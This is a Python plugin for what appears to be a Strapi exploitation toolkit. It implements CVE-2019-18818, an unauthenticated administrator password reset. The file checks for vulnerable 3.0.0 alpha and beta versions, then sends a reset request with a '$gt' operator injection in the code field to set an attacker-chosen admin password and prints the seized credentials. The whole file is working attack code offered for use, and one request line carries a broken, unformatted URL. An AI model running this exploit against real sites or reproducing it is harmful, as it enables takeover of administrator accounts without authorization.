'''CVE-2019-18818 exploit for Strapi. '''
from json import JSONDecodeError
import requests
from strapi_plugin import StrapiExploitInterface

class CVE2019_18818(StrapiExploitInterface):
    '''CVE-2019-18818 exploit for Strapi.'''
    def __init__(self):
        super().__init__("CVE-2019-18818", "Unauthenticated Password Reset Vulnerability / Privilege Escalation")
        self.url = None
    def check_if_vulnerable(self, version: str) -> bool:
        '''Check if the Strapi instance is vulnerable.'''
        if version.startswith('3.0.0-beta') or version.startswith('3.0.0-alpha'):
            return True
        return False
    def exploit(self, email: str, password: str) -> bool:
        '''Exploit the vulnerability.'''
        params = {
            "code": {"$gt":0},
            "password": password,
            "passwordConfirmation": password
        }
        payload = {
            "email": email, 
            "url":f"{self.url}/admin/plugins/users-permissions/auth/reset-password"
        }
        requests.post("{url}/", json=payload, timeout=10)
        try:
            r = requests.post(f"{self.url}/admin/auth/reset-password",
                json=params,
                timeout=10
            ).json()
            if "jwt" not in r:
                return False
            self.success(f"Password reset successfull.\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}\nPassword: {password}")
            return True
        except JSONDecodeError:
            return False
    def run(self) -> bool:
        self.url = self.input("Enter the URL of the Strapi instance")
        if self.url.endswith("/"):
            self.url = self.url[:-1]
        version = self.get_strapi_version(self.url)
        if not self.check_if_vulnerable(version):
            self.error("The Strapi instance is not vulnerable.")
            return True
        email = self.input("Admin email: ")
        password = self.input("Enter the new password: ")
        self.exploit(email, password)

def init():
    '''Initialize the plugin.'''
    return CVE2019_18818()
